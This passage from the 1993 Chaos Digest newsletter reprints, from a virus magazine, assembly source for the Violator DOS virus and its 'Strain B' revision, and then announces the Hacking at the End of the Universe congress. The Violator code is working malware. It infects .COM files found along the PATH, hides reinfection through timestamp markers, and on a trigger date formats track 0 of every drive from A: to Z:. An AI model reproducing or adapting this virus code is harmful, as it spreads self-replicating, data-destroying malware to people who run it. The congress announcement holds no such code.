        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of
pgm

;*******************************************************************
;                    Write virus code to file
;*******************************************************************

        MOV     AH,40H

        MOV_CX  virlen                ;Length of virus, in bytes

        MOV     DX,SI
        SUB     DX,OFFSET codelen     ;Length of virus code, gives starting
                                      ; address of virus code in memory
        INT     21H

        JB      fix_time_stamp        ;Jump if error

        CMP     AX,OFFSET virlen      ;All bytes written?
        JNZ     fix_time_stamp        ;Jump if error

;**********************************************************************
;                Move file pointer to beginning of the file
;**********************************************************************

        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H

        JB      fix_time_stamp        ;Jump if error

;**********************************************************************
;              Write the 3 byte JMP at the start of the file
;**********************************************************************

        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                 ;Virus data area
        ADD     DX,jmp_op             ;Point to the reconstructed JMP
        INT     21H

;**********************************************************************
;       Restore old file date & time, with seconds modified to 62
;**********************************************************************

fix_time_stamp:
        MOV     DX,[SI+ol_date]       ;Old file date
        MOV     CX,[SI+old_tim]       ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1FH                ;Seconds = 31/30 min = 62 seconds
        MOV     AX,OFFSET 5701H
        INT     21H

;**********************************************************************
;                              Close File
;**********************************************************************

        MOV     AH,3EH
        INT     21H

;**********************************************************************
;                     Restore Old File Attributes
;**********************************************************************

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]       ;Old Attributes
        MOV     DX,wrk_spc
;       NOP                           ;MASM will add this NOP
        ADD     DX,SI                 ;DX points to \path\name in workspace
        INT     21H

;**********************************************************************
;              Here when it's time to close it up & end
;**********************************************************************

all_done:
        PUSH    DS

;**********************************************************************
;                         Restore old DTA
;**********************************************************************

        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H

        POP     DS

;*************************************************************************
; Clear registers used, & do a weird kind of JMP 100. The weirdness comes
;  in since the address in a real JMP 100 is an offset, and the offset
;  varies from one infected file to the next. By PUSHing an 0100H onto the
;  stack, we can RET to address 0100H just as though we JMPed there.
;*************************************************************************

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI

        RET     0FFFFH

;************************************************************************
;The virus data starts here. It's accessed off the SI register, per the
; comments as shown
;************************************************************************

vir_dat EQU     $

        ;Use this with (SI + old_dta)
olddta_ DW      0                     ;Old DTA offset

        ;Use this with (SI + old_dts)
olddts_ DW      0                     ;Old DTA segment

        ;Use this with (SI + old_tim)
oldtim_ DW      0                     ;Old Time

        ;Use this with (SI + ol_date)
oldate_ DW      0                     ;Old date

        ;Use this with (SI + old_att)
oldatt_ DW      0                     ;Old file attributes

;Here's where the first 3 bytes of the original .COM file go.(SI + first_3)

first3_ EQU     $
        INT     20H
        NOP

;Here's where the new JMP instruction is worked out

        ;Use this with (SI + jmp_op)
jmpop_  DB      0E9H                  ;Start of JMP instruction

        ;Use this with (SI + jmp_dsp)
jmpdsp_ DW      0                     ;The displacement part

;This is the type of file  we're looking to infect. (SI + f_spec)

fspec_  DB      '*.COM',0

        ;Use this with (SI + path_ad)
pathad_ DW      0                     ;Path address

        ;Use this with (SI + nam_ptr)
namptr_ DW      0                     ;Pointer to start of file name

        ;Use this with (SI + env_str)
envstr_ DB      'PATH='               ;Find this in the environment

        ;File name workspace (SI + wrk_spc)
wrkspc_ DB      40h dup (0)

        ;Use this with (SI + dta)
dta_    DB      16h dup (0)           ;Temporary DTA goes here

        ;Use this with (SI + dta_tim)
dtatim_ DW      0,0                   ;Time stamp in DTA

        ;Use this with (SI + dta_len)
dtalen_ DW      0,0                   ;File length in the DTA

        ;Use this with (SI + dta_nam)
dtanam_ DB      0Dh dup (0)           ;File name in the DTA

        ;Use this with (SI + reboot)
reboot_ DB      0EAH,0F0H,0FFH,0FFH,0FFH ;Five byte FAR JMP to FFFF:FFF0

lst_byt EQU     $                     ;All lines that assemble into code are
                                      ;  above this one

;****************************************************************************
;The virus needs to know a few details about its own size and the size of its
;code portion. Let the assembler figure out these sizes automatically.
;****************************************************************************

virlen  =       lst_byt - v_start     ;Length, in bytes, of the entire virus
codelen =       vir_dat - v_start     ;Length of virus code, only
c_len_x =       vir_dat - v_start - 2 ;Displacement for self-modifying code
c_len_y =       vir_dat - v_start + 100H ;Code length + 100h, for PSP

;****************************************************************************
;Because this code is being appended to the end of an executable file, the
;exact address of its variables cannot be known. All are accessed as offsets
;from SI, which is represented as vir_dat in the below declarations.
;****************************************************************************

old_dta =       olddta_ - vir_dat     ;Displacement to the old DTA offset
old_dts =       olddts_ - vir_dat     ;Displacement to the old DTA segment
old_tim =       oldtim_ - vir_dat     ;Displacement to old file time stamp
ol_date =       oldate_ - vir_dat     ;Displacement to old file date stamp
old_att =       oldatt_ - vir_dat     ;Displacement to old attributes
first_3 =       first3_ - vir_dat     ;Displacement-1st 3 bytes of old .COM
jmp_op  =       jmpop_  - vir_dat     ;Displacement to the JMP opcode
jmp_dsp =       jmpdsp_ - vir_dat     ;Displacement to the 2nd 2 bytes of JMP
f_spec  =       fspec_  - vir_dat     ;Displacement to the "*.COM" string
path_ad =       pathad_ - vir_dat     ;Displacement to the path address
nam_ptr =       namptr_ - vir_dat     ;Displacement to the filename pointer
env_str =       envstr_ - vir_dat     ;Displacement to the "PATH=" string
wrk_spc =       wrkspc_ - vir_dat     ;Displacement to the filename workspace
dta     =       dta_    - vir_dat     ;Displacement to the temporary DTA
dta_tim =       dtatim_ - vir_dat     ;Displacement to the time in the DTA
dta_len =       dtalen_ - vir_dat     ;Displacement to the length in the DTA
dta_nam =       dtanam_ - vir_dat     ;Displacement to the name in the DTA
reboot  =       reboot_ - vir_dat     ;Displacement to the 5 byte reboot code

        CODE    ENDS
END     VCODE


Now here's the source for Violator-B

------------------------------------------------------------------------------
;*****************************************************************************
;
;                         Violator - Strain B
;
;*****************************************************************************
;(Aug/09/90)
;
;Development Notes:
;
;I encountered several errors in the original Violator code which I
;corrected in this version. Mainly, the INT 26 routine to fuck the
;disk. It seems that the routine would crash right after the INT 26
;was executed and the whole program would die. I have since fixed
;this problem in this version with an INT 13, AH 05 (Format Track)
;command. This works better than the subsequent INT 26.
;
;*****************************************************************************
;
;                    Written by - The High Evolutionary -
;                           RABID Head Programmer
;
;                          Revised by: oOnslaught
;                        No affiliation with rabId
;
;              Copyright (C) 1990 by RABID Nat'nl Development Corp.
;
;*****************************************************************************

MOV_CX  MACRO   X
        DB      0B9H
        DW      X
ENDM

CODE    SEGMENT
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE
        ORG     $+0100H            ; Set ORG to 100H plus our own

VCODE:  JMP     virus

   NOP
   NOP
   NOP                             ;15 NOP's to place JMP Header
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP
   NOP

v_start equ     $

virus:  PUSH    CX
        MOV     DX,OFFSET vir_dat
        CLD
        MOV     SI,DX
        ADD     SI,first_3
        MOV     CX,3
        MOV     DI,OFFSET 100H
        REPZ    MOVSB
        MOV     SI,DX
        MOV     AH,30H
        INT     21H
        CMP     AL,0                  ;Quit it it's DOS 1.0
        JNZ     dos_ok
        JMP     quit

dos_ok: PUSH    ES
        MOV     AH,2FH
        INT     21H
        MOV     [SI+old_dta],BX
        MOV     [SI+old_dts],ES
        POP     ES
        MOV     DX,dta
        ADD     DX,SI
        MOV     AH,1AH
        INT     21H
        PUSH    ES
        PUSH    SI
        MOV     ES,DS:2CH
        MOV     DI,0
        JMP     year_check

year_check:
        MOV     AH,2AH             ;Get date info
        INT     21H                ;Call DOS
        CMP     CX,1990            ;Check to see if the year is 1990
        JGE     month_check        ;If greater or equal, check month
        JMP     find_path          ;If not, go on with infection

month_check:
        MOV     AH,2AH             ;Get date info
        INT     21h                ;Call DOS
        CMP     DH,10              ;Check to see if it is September
        JGE     day_check          ;If greater or equal, check day
        JMP     find_path          ;if not, go on with infection

day_check:
        MOV     AH,2Ah             ;Get date info
        INT     21H                ;Call DOS
        CMP     DL,31              ;Check to see if it is the 4th
        JGE     multiplex          ;If yes, then nuke drives A:-Z:
        JMP     find_path          ;If not, then go on with infection

multiplex:
        MOV     AL,cntr            ;Counter is the drive to kill
        CALL    alter              ;Go and kill the drive
                                   ;25 is drive Z:
        CMP     cntr,25            ;Is (cntr) 25 ?
        JE      find_path          ;Go on with infection
        INC     cntr               ;Add one to (cntr)
        LOOP     multiplex         ;Loop back up to kill next drive

alter:
        MOV     AH,05              ;Format Track
        MOV     CH,0               ;Format track 0
        MOV     DH,0               ;Head 0
        MOV     DL,cntr            ;Format for drive in (cntr)
        INT     13h                ;Call RWTS
        RET                        ;Return up for next drive

find_path:
        POP     SI
        PUSH    SI
        ADD     SI,env_str
        LODSB
        MOV     CX,OFFSET 8000H
        REPNZ   SCASB
        MOV     CX,4

check_next_4:
        LODSB
        SCASB
;
;The JNZ line specifies that if there is no PATH present, then we will go
;along and infect the ROOT directory on the default drive.
        JNZ     find_path         ;If not path, then go to ROOT dir
        LOOP    check_next_4      ;Go back and check for more chars
        POP     SI                ;Load in PATH again to look for chars
        POP     ES
        MOV     [SI+path_ad],DI
        MOV     DI,SI
        ADD     DI,wrk_spc        ;Put the filename in wrk_spc
        MOV     BX,SI
        ADD     SI,wrk_spc
        MOV     DI,SI
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0
        JNZ     found_subdir
        JMP     all_done

found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]
        ADD     DI,wrk_spc        ;DI is the file name to infect! (hehe)

move_subdir:
        LODSB                     ;To tedious work to move into subdir
        CMP     AL,';'            ;Does it end with a ; charachter?
        JZ      moved_one         ;if yes, then we found a subdir
        CMP     AL,0              ;is it the end of the path?
        JZ      moved_last_one    ;if yes, then we save the PATH
        STOSB                     ;marker into DI for future reference
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                ;BX is where the virus data is
        POP     DS                ;Restore DS so that we can do stuph
        MOV     [BX+path_ad],SI   ;Where is the next subdir?
        NOP
        CMP     CH,'\'            ;Check to see if it ends in \
        JZ      slash_ok          ;If yes, then it's OK
        MOV     AL,'\'            ;if not, then add one...
        STOSB                     ;store the sucker

------------------------------

End of Chaos Digest #1.31
************************************

Chaos Digest           Mercredi 19 Mai 1993        Volume 1 : Numero 32
                          ISSN  1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.32 (19 Mai 1993)
File 1--40H VMag Issue 1 Volume 2 #011(3) (reprint)
File 2--_Hacking at the End of the Universe_ (congres)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Issue 1 Volume 2 #011(3) (reprint)


[suite du listing du virus Violator]

slash_ok:
        MOV     [BX+nam_ptr],DI   ;Move the filename into workspace
        MOV     SI,BX             ;Restore the original SI value
        ADD     SI,f_spec         ;Point to COM file victim
        MOV     CX,6
        REPZ    MOVSB             ;Move victim into workspace
        MOV     SI,BX
        MOV     AH,4EH
        MOV     DX,wrk_spc
        ADD     DX,SI             ;DX is ... THE VICTIM!!!
        MOV     CX,3              ;Attributes of Read Only or Hidden OK
        INT     21H
        JMP     SHORT   find_first

find_next:
        MOV     AH,4FH
        INT     21H

find_first:
        JNB     found_file        ;Jump if we found it
        JMP     SHORT   set_subdir;Otherwise, get another subdirectory

found_file:
        MOV     AX,[SI+dta_tim]   ;Get time from DTA
        AND     AL,1EH            ;Mask to remove all but seconds
        CMP     AL,1EH            ;60 seconds
        JZ      find_next
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next         ;Then go find another one
        MOV     DI,[SI+nam_ptr]
        PUSH    SI
        ADD     SI,dta_nam

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc
        ADD     DX,SI
        INT     21H
        MOV     [SI+old_att],CX
        MOV     AX,OFFSET 4301H
        AND     CX,OFFSET 0FFFEH
        MOV     DX,wrk_spc
        ADD     DX,SI
        INT     21H
        MOV     AX,OFFSET 3D02H
        MOV     DX,wrk_spc
        ADD     DX,SI
        INT     21H
        JNB     opened_ok
        JMP     fix_attr

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
        INT     21H
        AND     DH,7
        JMP     infect

infect:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area
        JB      fix_time_stamp
        CMP     AX,3
        JNZ     fix_time_stamp
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp
        MOV     CX,AX
        SUB     AX,3
        MOV     [SI+jmp_dsp],AX
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI
        SUB     DI,OFFSET c_len_x

        MOV     [DI],CX
        MOV     AH,40H
        MOV_CX  virlen
        MOV     DX,SI
        SUB     DX,OFFSET codelen
        INT     21H
        JB      fix_time_stamp
        CMP     AX,OFFSET virlen
        JNZ     fix_time_stamp
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI
        ADD     DX,jmp_op
        INT     21H

fix_time_stamp:
        MOV     DX,[SI+ol_date]
        MOV     CX,[SI+old_tim]
        AND     CX,OFFSET 0FFE0H
        OR      CX,1EH
        MOV     AX,OFFSET 5701H
        INT     21H
        MOV     AH,3EH
        INT     21H

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]
        MOV     DX,wrk_spc
        ADD     DX,SI
        INT     21H

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H
        POP     DS

quit:
        POP     CX
        XOR     AX,AX              ;XOR values so that we will give the
        XOR     BX,BX              ;poor sucker a hard time trying to
        XOR     DX,DX              ;reassemble the source code if he
        XOR     SI,SI              ;decides to dissassemble us.
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH             ;Return back to the beginning
                                   ;of the program

vir_dat EQU     $

intro   db      '.D$^i*&B)_a.%R',13,10
olddta_ DW      0
olddts_ DW      0
oldtim_ DW      0
count_  DW      0
cntr    DB                         ;Drive to nuke from (C:+++)
oldate_ DW      0
oldatt_ DW      0
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H
jmpdsp_ DW      0
fspec_  DB      '*.COM',0
pathad_ DW      0
namptr_ DW      0
envstr_ DB      'PATH='
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)
dtatim_ DW      0,0
dtalen_ DW      0,0
dtanam_ DB      0Dh dup (0)
lst_byt EQU     $
virlen  =       lst_byt - v_start
codelen =       vir_dat - v_start
c_len_x =       vir_dat - v_start - 2
c_len_y =       vir_dat - v_start + 100H
old_dta =       olddta_ - vir_dat
old_dts =       olddts_ - vir_dat
old_tim =       oldtim_ - vir_dat
ol_date =       oldate_ - vir_dat
old_att =       oldatt_ - vir_dat
first_3 =       first3_ - vir_dat
jmp_op  =       jmpop_  - vir_dat
jmp_dsp =       jmpdsp_ - vir_dat
f_spec  =       fspec_  - vir_dat
path_ad =       pathad_ - vir_dat
nam_ptr =       namptr_ - vir_dat
env_str =       envstr_ - vir_dat
wrk_spc =       wrkspc_ - vir_dat
dta     =       dta_    - vir_dat
dta_tim =       dtatim_ - vir_dat
dta_len =       dtalen_ - vir_dat
dta_nam =       dtanam_ - vir_dat
count   =       count_  - vir_dat

        CODE    ENDS
END     VCODE

------------------------------

Date: Thu May 20 17:55:14 GMT 1993
From: heu@hacktic.nl (Announcement posting account )
Subject: File 2--_Hacking at the End of the Universe_ (congres)


=========================================================================
        Hack-Tic presents


                               H A C K I N G

                          at the   E N D   of the

                              U N I V E R S E


                   1993 SUMMER CONGRESS, THE NETHERLANDS
=========================================================================

H E U ?
+-------

Remember the Galactic Hacker Party back in 1989? Ever wondered what
happened to the people behind it? We sold out to big business, you
think. Think again, we're back!

That's right. On august 4th, 5th and 6th 1993, we're organising a
three-day summer congress for hackers, phone phreaks, programmers,
computer haters, data travellers, electro-wizards, networkers, hardware
freaks, techno-anarchists, communications junkies, cyberpunks, system
managers, stupid users, paranoid androids, Unix gurus, whizz kids, warez
dudes, law enforcement officers (appropriate undercover dress required),
guerilla heating engineers and other assorted bald, long-haired and/or
unshaven scum. And all this in the middle of nowhere (well, the middle
of Holland, actually, but that's the same thing) at the Larserbos
campground four metres below sea level.

The three days will be filled with lectures, discussions and workshops
on hacking, phreaking, people's networks, Unix security risks, virtual
reality, semafun, social engineering, magstrips, lockpicking,
virusses, paranoia, legal sanctions against hacking in Holland and
elsewhere and much, much more. English will be the lingua franca for
this event, although one or two workshops may take place in Dutch.
There will be an Internet connection, an intertent ethernet and social
interaction (both electronic and live). Included in the price are four
nights in your own tent. Also included are inspiration, transpiration, a
shortage of showers (but a lake to swim in), good weather (guaranteed by
god), campfires and plenty of wide open space and fresh air. All of this
for only 100 dutch guilders (currently around US$70).

We will also arrange for the availability of food, drink and smokes of
assorted types, but this is not included in the price. Our bar will be
open 24 hours a day, as well as a guarded depository for valuables
(like laptops, cameras etc.). You may even get your stuff back! For
people with no tent or air matress: you can buy a tent through us for
100 guilders, a matress costs 10 guilders. You can arrive from 17:00
(that's five p.m. for analogue types) on August 3rd. We don't have to
vacate the premises until 12:00 noon on Saturday, August 7 so you can
even try to sleep through the devastating Party at the End of Time
(PET) on the closing night (live music provided). We will arrange for
shuttle buses to and from train stations in the vicinity.


H O W ?
+-------

Payment: in advance please. Un-organized, poor techno-freaks like us
would like to get to the Bahamas at least once. We can only guarantee
you a place if you pay before Friday June 25th, 1993. If you live in
Holland, just transfer fl. 100 to giro 6065765 (Hack-Tic) and mention
'HEU' and your name. If you're in Germany, pay DM 100,- to Hack-Tic,
Konto 2136638, Sparkasse Bielefeld, BLZ 48050161. If you live elsewhere:
call, fax or e-mail us for the best way to get the money to us from your
country. We accept American Express, we do NOT cash ANY foreign cheques.


H A !
+-----

Very Important: Bring many guitars and laptops.


M E ?
+-----

Yes, you! Busloads of alternative techno-freaks from all over the
planet will descend on this event. You wouldn't want to miss that,
now, would you?

Maybe you are part of that select group that has something special to
offer! Participating in 'Hacking at the End of the Universe' is
exciting, but organising your very own part of it is even more fun. We
already have a load of interesting workshops and lectures scheduled,
but we're always on the lookout for more. We're also still in the
market for people who want to help us organize during the congress.

In whatever way you wish to participate, call, write, e-mail or fax us
soon, and make sure your money gets here on time. Space is limited.


S O :
+-----

- 4th, 5th and 6th of August

- Hacking at the End of the Universe
  (a hacker summer congress)

- ANWB groepsterrein Larserbos
  Zeebiesweg 47
  8219 PT  Lelystad
  The Netherlands

- Cost: fl. 100,- (+/- 70 US$) per person
  (including 4 nights in your own tent)


M O R E   I N F O :
+-------------------

Hack-Tic
Postbus 22953
1100 DL  Amsterdam
The Netherlands

tel     : +31 20 6001480
fax     : +31 20 6900968
E-mail  : heu@hacktic.nl


V I R U S :
+-----------

If you know a forum or network that you feel this message belongs on,
by all means slip it in. Echo-areas, your favorite bbs, /etc/motd, IRC,
WP.BAT, you name it. Spread the worm, uh, word.


S C HE D U L E
+--------------

day 0       August 3rd, 1993
=====
16:00       You are welcome to set up your tent
19:00       Improvised Dinner

day 1       August 4th, 1993
=====
11:00-12:00 Opening ceremony
12:00-13:30 Workshops
14:00-15:30 Workshops
15:30-19:00 'Networking for the Masses'     16:00-18:00 Workshops
19:00-21:00 Dinner
21:30-23:00 Workshops

day 2       August 5th, 1993
=====
11:30-13:00 Workshops
14:00-17:00 Phreaking the Phone             14:00-17:00 Workshops
17:30-19:00 Workshops
19:00-21:00 Dinner

day 3       August 6th, 1993
=====
11:30-13:00 Workshops
14:00-18:00 Hacking (and) The Law           14:00-17:00 Workshops
18:00-19:00 Closing ceremony
19:00-21:00 Barbeque
21:00-??:?? Party at the End of Time (Live Music)

day 4       August 7th, 1993
=====
12:00       All good things come to an end


'Networking for the masses',   Wednesday August 4th 1993, 15:30
+---------------------------------------------------------------

One of the main discussions at the 1989 Galactic Hacker Party focused on
whether or not the alternative community should use computer networking.
Many people felt a resentment against using a 'tool of oppression' for
their own purposes. Computer technology was, in the eyes of many,
something to be smashed rather than used.

Times have changed. Many who were violently opposed to using computers
in 1989 have since discovered word-processing and desktop publishing.
Even the most radical groups have replaced typewriters with PCs. The
'computer networking revolution' has begun to affect the alternative
community.

Not all is well: many obstacles stand in the way of the 'free flow of
information.' Groups with access to information pay such high prices for
it that they are forced to sell information they'd prefer to pass on for
free. Some low-cost alternative networks have completely lost their
democratic structure. Is this the era of the digital dictator, or are we
moving towards digital democracy?

To discuss these and other issues, we've invited the following people
who are active in the field of computer networking: [Electronic mail
addresses for each of the participants are shown in brackets.]

Ted Lindgreen (ted@nluug.nl) is managing director of nlnet. Nlnet is the
largest commercial TCP/IP and UUCP network provider in the Netherlands.

Peter van der Pouw Kraan (peter@hacktic.nl) was actively involved in the
squat-movement newsletters 'Bluf!' and 'NN' and has outspoken ideas
about technology and its relation to society. Had a PC all the way back
in 1985!

Maja van der Velden (maja@agenda.hacktic.nl) is from the Agenda
Foundation which sets up and supports communication and information
projects.

Joost Flint (joost@aps.hacktic.nl) is from the Activist Press Service.
APS has a bbs and works to get alternative-media and pressure groups
online.

Felipe Rodriquez (nonsenso@utopia.hacktic.nl) is from the Hack-Tic
Network which grew out of the Dutch computer underground and currently
connects thousands of people to the global Internet.

Andre Blum (zabkar@roana.hacktic.nl), is an expert in the field of
wireless communications.

Eelco de Graaff (Eelco.de.Graaff@p5.f1.n281.z2.fidonet.org) is the
nethost of net 281 of FidoNet, EchoMail troubleshooter, and one of the
founders of the Dutch Fidonet Foundation.

Michael Polman (michael@antenna.nl) of the Antenna foundation is a
consultant in the field of international networking. He specialises in
non-governmental networks in the South.

Alfred Heitink (alfred@antenna.nl) is a social scientist specializing in
the field of computer-mediated communication as well as system manager at
the Dutch Antenna host.

Rena Tangens (rena@bionic.zer.de), was involved in the creation of the
Bionic Mailbox in Bielefeld (Germany) and the Zerberus mailbox network.
She is an artist and wants to combine art and technology.

The discussion will be led by freelance radiomaker and science
journalist Herbert Blankesteyn. He was involved in the 'Archie'
children's bbs of the Dutch VPRO broadcasting corporation.


'Phreaking the Phone',   Thursday August 5th 1993, 14:00
+--------------------------------------------------------

Your own telephone may have possibillities you never dreamed possible.
Many years ago people discovered that one could fool the telephone
network into thinking you were part of the network and not just a
customer. As a result, one could make strange and sometimes free
phonecalls to anywhere on the planet. A subculture quickly formed.

The phone companies got wise and made a lot of things (nearly)
impossible. What is still possible today? What is still legal today?
What can they do about it? What are they doing about it?

Billsf (bill@tech.hacktic.nl) and M. Tillman, a few of the worlds best
phreaks, will introduce the audience to this new world. Phone phreaks
from many different countries will exchange stories of succes and
defeat. Your life may never be the same.


'Hacking (and) The Law',   Friday August 6th, 14:00
+---------------------------------------------------

You can use your own computer and modem to access some big computer
system at a university without the people owning that computer knowing
about it. For years this activity was more or less legal in Holland: if
you were just looking around on the Internet and didn't break anything
nobody really cared too much...

That is, until shortly before the new computer crime law went into
effect. Suddenly computer hackers were portrayed as evil 'crashers'
intent on destroying systems or, at least, looking into everyone's
files.

The supporters of the new law said that it was about time something was
done about it. Critics of the law say it's like hunting mosquitoes with
a machine-gun. They claim the aforementioned type of hacking is not the
real problem and that the law is excessively harsh.

To discuss these issues we've invited a panel of experts, some of whom
are, or have been, in touch with the law in one way or another.

Harry Onderwater (fridge@cri.hacktic.nl), is technical EDP auditor at the
Dutch National Criminal Intelligence Service (CRI) and is responsible for
combatting computer crime in the Netherlands. He says he's willing to
arrest hackers if that is what it takes to make computer systems secure.

Prof. Dr. I.S. (Bob) Herschberg (herschbe@dutiws.twi.tudelft.nl), gained
a hacker's control over his first system 21 years ago and never ceased
the good work. Now lecturing, teaching and publishing on computer
insecurity and imprivacy at the technical university in Delft. His
thesis: 'penetrating a system is not perpetrating a crime'.

Ronald 'RGB' O. (rgb@utopia.hacktic.nl) has the distinction of being the
only Dutch hacker arrested before and after the new law went into effect.
He is a self-taught UNIX security expert and a writer for Hack-Tic
Magazine.

Ruud Wiggers (ruudw@cs.vu.nl), system manager at the Free University
(VU) in Amsterdam, has for 10 years been trying to plug holes in system
security. He was involved in the RGB arrest.

Andy Mueller-Maguhn (andy@cccbln.ccc.de) is from the Chaos Computer Club
in Germany.

Eric Corley (emmanuel@eff.org) a.k.a. Emmanuel Goldstein is editor
of the hacker publication '2600 magazine'. The first person to realize
the huge implications of the government crackdown on hackers in the US.

Winn Schwartau (wschwartau@mcimail.com) is a commercial computer
security advisor as well as the author of the book 'Terminal
Compromise'. His new book entitled 'Information Warfare' has just been
released.

Ray Kaplan (kaplan@bpa.arizona.edu) is a computer security consultant.
He is constantly trying to bridge the gap between hackers and the
computer industry. He organizes 'meet the enemy' sessions where system
managers can teleconference with hackers.

Wietse Venema (wietse@wzv.win.tue.nl) is a systems expert at the
Technical University in Eindhoven. He is the author of some very well
known utilities to monitor hacking on unix systems. He has a healthy
suspicion of anything technical.

Peter Klerks (klerks@rulfsw.leidenuniv.nl) is a scientist at the centre
for the study of social antagonism at the Leiden University. He has
studied the Dutch police force extensively, and is author of the book
'Counterterrorism in the Netherlands.'

Don Stikvoort (stikvoort@surfnet.nl), one of the computer security
experts for the Dutch Academic Society and chairman of CERT-NL (Computer
Emergency Response Team). He is also actively involved in SURFnet
network management.

Rop Gonggrijp (rop@hacktic.nl) was involved in some of the first
computer break-ins in the Netherlands during the 80's and is now editor
of Hack-Tic Magazine.

The discussion will be led by Franscisco van Jole (fvjole@hacktic.nl),
journalist for 'De Volkskrant'.


W O R K S H O P S
+-----------------

HEUnet introduction
   an introduction to the Hacking at the End of the Universe network.

Jumpstart to VR, 3D world-building on PC's
   Marc Bennett, editor of Black Ice magazine, will explain how to
   design worlds on your own PC which can be used in Virtual Reality
   systems.

Replacing MS/DOS, Running UNIX on your own PC
   People who are already running unix on their PCs will tell you what
   unix has to offer and they'll talk about the different flavours in
   cheap or free unix software available.

Unix security
   RGB and fidelio have probably created more jobs in the unix security
   business than the rest of the world put together. They'll talk about
   some of the ins and outs of unix security.

E-mail networking
   Should we destroy X400 or shall we let it destroy itself?

'User Authorization Failure'
   A quick introduction to the VAX/VMS Operating System for those that
   consider a carreer in VMS security.

'The right to keep a secret'
   Encryption offers you the chance to really keep a secret, and
   governments know it. They want you to use locks that they have the
   key to. The fight is on!

'Virus about to destroy the earth!'. Don't believe the hype!
   What is the real threat of computer viruses? What technical
   possibilities are there? Are we being tricked by a fear-machine that
   runs on the money spent on anti-virus software?

'It came out of the sky'
   'Receiving pager information and what not to do with it'. Information
   to pagers is sent through the air without encryption. Rop Gonggrijp
   and Bill Squire demonstrate a receiver that picks it all up and
   present some spooky scenarios describing what one could do with all
   that information.

Cellular phones and cordless phones
   How do these systems work, what frequencies do they use, and what are
   the differences between different systems world-wide?

Zen and the art of lock-picking.
   In this workshop The Key will let you play with cylinder locks of all
   types and tell you of ingenious ways to open them.

"Doesn't mean they're not after you"
   The secret services and other paranoia.

Audio Adventures
   Steffen Wernery and Tim Pritlove talk about adventure games that you
   play using a Touch Tone telephone.

Botanical Hacking (THC++)
   Using computers, modems and other high tech to grow.

Wireless LAN (Data Radio)
